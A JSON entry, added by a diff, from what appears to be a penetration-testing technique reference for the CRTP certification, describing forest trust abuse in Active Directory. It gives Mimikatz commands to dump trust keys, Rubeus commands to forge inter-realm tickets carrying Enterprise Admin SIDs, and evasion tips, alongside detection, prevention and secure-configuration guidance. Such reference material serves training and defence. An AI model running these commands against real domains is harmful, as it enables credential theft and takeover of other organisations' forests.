@@ -1,0 +1,102 @@
+{
+  "id": "crtp-forest-trust-abuse",
+  "name": "Forest Trust Abuse (Inter-Realm TGT Forgery)",
+  "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /sids:<target_enterprise_admin_sid> /user:Administrator /service:krbtgt /target:<target_domain> /ptt",
+  "description": "Forge an inter-realm TGT using the forest trust key (shared secret) to access resources in a trusted external forest.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Cross-Trust",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "moderate",
+  "mitre": [
+    "T1558.001",
+    "T1482"
+  ],
+  "tools": [
+    "Rubeus",
+    "SafetyKatz"
+  ],
+  "tags": [
+    "forest-trust",
+    "inter-realm",
+    "trust-key",
+    "cross-forest",
+    "external-trust"
+  ],
+  "steps": [
+    {
+      "label": "Get trust key via lsadump::trust",
+      "command": "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'"
+    },
+    {
+      "label": "Get target forest SID",
+      "command": "Get-DomainSID -Domain <target_domain>"
+    },
+    {
+      "label": "Forge inter-realm TGT",
+      "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /sids:<target_enterprise_admin_sid> /user:Administrator /service:krbtgt /target:<target_domain> /ptt"
+    },
+    {
+      "label": "Request TGS in target forest",
+      "command": "Rubeus.exe asktgs /ticket:<b64_ticket> /service:cifs/<dc_host> /dc:<dc_host> /ptt"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Dump trust key",
+      "command": "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'"
+    },
+    {
+      "label": "Forge inter-realm TGT",
+      "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:corp.local /sid:S-1-5-21-CORP /sids:S-1-5-21-EXTCORP-519 /user:Administrator /service:krbtgt /target:extcorp.local /ptt"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-powerview-trusts",
+      "note": "Enumerate forest trusts first",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-child-to-parent",
+      "note": "Child-to-parent for intra-forest escalation",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-dcsync",
+      "note": "DCSync after gaining forest-wide access",
+      "rel": "next"
+    }
+  ],
+  "notes": "SID filtering (quarantine) blocks EA SIDs from external forest. Only works against non-SID-filtered, non-selective trusts.",
+  "references": [
+    {
+      "title": "CRTP - Forest Trust Abuse",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "HackTricks - Forest Trust",
+      "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/external-forest-domain-one-way-outbound"
+    }
+  ],
+  "defense": {
+    "why_it_works": "When two forests have a bidirectional trust with SID filtering disabled (EnableSIDFilteringForestTrusts = False), an attacker in Forest A who has compromised the trust key (inter-forest TGT key, shared between forest trust accounts) can forge an inter-realm TGT with extra SIDs from Forest B's privileged groups. The forest root DC in Forest B honors the forged extra SIDs and grants access to Forest B resources as if the attacker were a member of those groups.",
+    "prerequisites": "Forest A compromise (DA level). Trust key extraction (via LSA secrets or DCSync of the trust account). Forest B SID and privileged group SIDs. Rubeus /golden with /sids across forest boundary. SID filtering disabled on the trust.",
+    "impact": "T1558.001 Golden Ticket + T1482 Domain Trust Discovery. Complete compromise of Forest B if SID filtering is disabled. Enterprise Admin-equivalent in the trusted forest. Lateral movement across forest boundaries using forged inter-realm tickets.",
+    "detection": "MDI cross-forest: 'Suspected forged PAC with extra SIDs crossing forest trust'. Event 4769 in Forest B DC with inter-realm TGT from Forest A containing extra SIDs not matching the user's actual AD attributes. PAC inspection at the forest trust boundary. SID filtering (if enabled) would reject the request at the DC before generating logs.\nAnomalous Kerberos activity: forged or stolen tickets by correlating malformed fields in logon events, RC4-encrypted TGTs, or TGS requests without corresponding TGT requests; suspicious processes accessing LSASS memory for ticket extraction (DET0522/AN1443).\nSuspicious access to SSSD secrets database and Kerberos key material indicating ticket theft or replay; correlate anomalous file access with unusual Kerberos service ticket requests (AN1444).\nForging or replaying Kerberos tickets: monitor Unified Logs for anomalous kinit/klist activity and unusual authentication sequences (AN1445).",
+    "artifacts": "MDI alert: cross-forest privilege escalation | Forest B DC Event 4769: inter-realm ticket with unexpected extra SIDs | Trust account last logon anomaly | SIEM: cross-forest DA access from Forest A user",
+    "prevention": "Enable SID filtering on all forest trusts: netdom trust TrustedForest /domain:TrustingForest /enablesidhistory:no /filtersids:yes. This is the primary mitigation. MDI deployment on both forest DCs. Regular trust inventory and review. Use Selective Authentication on cross-forest trusts to restrict which resources are accessible.\nActive Directory Configuration: Reset KRBTGT account password twice (invalidates all golden tickets); rotate every 180 days.\nAudit: Scan for insecure Kerberos configurations.\nCredential Access Protection: On Linux, use SELinux to protect Kerberos key material.\nEncrypt Sensitive Information: Enable AES Kerberos encryption instead of RC4.\nPassword Policies: Service accounts should have 25+ character passwords; use Group Managed Service Accounts (gMSA).\nPrivileged Account Management: Limit domain admin to DCs only; restrict service account privileges.",
+    "evasion": "Move laterally in Forest B using the forged ticket to access only specific resources rather than full DA access (avoids broad scope alerting). Use resources that have explicit cross-forest access configured (SelectiveAuthentication allowances).",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1558/001/",
+      "https://attack.mitre.org/techniques/T1482/"
+    ],
+    "misconfiguration": "Forest trust with SID filtering disabled (must be explicitly disabled \u2014 default is filtering enabled for forest trusts). Bidirectional trust when unidirectional was intended. No MDI across both forests.",
+    "vulnerable_config": "# SID filtering disabled on forest trust (explicitly misconfigured):\nGet-ADTrust -Filter {Target -eq 'TRUSTED.COM'} | Select-Object SIDFilteringForestAware\n# SIDFilteringForestAware: False \u2192 SID History crosses forest boundary \u2192 CRITICAL\n\n# Trust key extractable via DCSync of trust account:\n# mimikatz lsadump::trust /patch \u2192 inter-realm trust key\n# \u2192 forge inter-realm TGT with TRUSTED.COM EA SID \u2192 access TRUSTED.COM as EA",
+    "secure_config": "# Enable SID filtering on forest trust:\nnetdom trust TRUSTED.COM /domain:CORP.LOCAL /enablesidhistory:no /filtersids:yes\n\n# Verify:\n(Get-ADTrust -Filter {Target -eq 'TRUSTED.COM'}).SIDFilteringForestAware  # Should be True\n\n# Use Selective Authentication (limit which resources cross-forest users can access):\nSet-ADTrust -Identity 'TRUSTED.COM' -SelectiveAuthentication $true\n# Then explicitly grant 'Allowed to authenticate' on specific resources\n\n# Deploy MDI on forest root DCs of both forests:\n# MDI cross-forest trust monitoring detects anomalous inter-realm tickets"
+  }
+}
